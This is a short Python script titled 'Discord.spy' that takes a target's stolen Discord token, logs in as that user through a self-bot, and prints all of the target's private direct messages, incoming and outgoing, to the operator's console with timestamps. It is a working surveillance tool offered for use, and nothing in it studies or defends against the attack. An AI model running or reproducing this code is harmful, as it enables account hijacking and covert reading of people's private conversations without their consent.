### code is shat, dont judge fam ###

import discord
from discord.ext import commands
import asyncio
import os
import random
import datetime

os.system('cls')
print("\n" * 500)
prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)


banner = """\u001b[38;5;45m
ooo.    o                                 8                         
8  `8.                                    8                         
8   `8 o8 .oPYo. .oPYo. .oPYo. oPYo. .oPYo8    \u001b[38;5;196m.oPYo. .oPYo. o    o\u001b[38;5;45m 
8    8  8 Yb..   8    ' 8    8 8  `' 8    8    \u001b[38;5;196mYb..   8    8 8    8\u001b[38;5;45m 
8   .P  8   'Yb. 8    . 8    8 8     8    8      \u001b[38;5;196m'Yb. 8    8 8    8\u001b[38;5;45m 
8ooo'   8 `YooP' `YooP' `YooP' 8     `YooP' \u001b[38;5;196m88 `YooP' 8YooP' `YooP8\u001b[38;5;45m 
.....:::..:.....::.....::.....:..:::::.....:..::.....:\u001b[38;5;196m8 \u001b[38;5;45m....::....\u001b[38;5;196m8\u001b[38;5;45m 
::::::::::::::::::::::::::::::::::::::::::::::::::::::\u001b[38;5;196m8 \u001b[38;5;45m:::::::\u001b[38;5;196mooP'\u001b[38;5;45m.
::::::::::::::::::::::::::::::::::::::::::::::::::::::..:::::::...::
"""

print(banner)
print("""
 Discord.spy // Ver 1.0 // spicesouls.github.io
[----------------------------------------------]
""")
token = input("Input Your \u001b[32mTarget\u001b[38;5;45m's Token: ")
current_time = datetime.datetime.now()
print("---\u001b[33m " + str(current_time.year) + "/" + str(current_time.month) + "/" + str(current_time.day) + " \u001b[38;5;45m---")

@bot.event
async def on_message(message):
    current_time = datetime.datetime.now()
    if message.channel.type is discord.ChannelType.private:
        if bot.user.id == message.author.id:
            print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[32m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
        else:
            print(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + " <\u001b[31m" + str(message.author) + "\u001b[38;5;45m/" + str(message.channel) + "> " + str(message.content))
    else:
        pass
        

bot.run(token, bot=False)
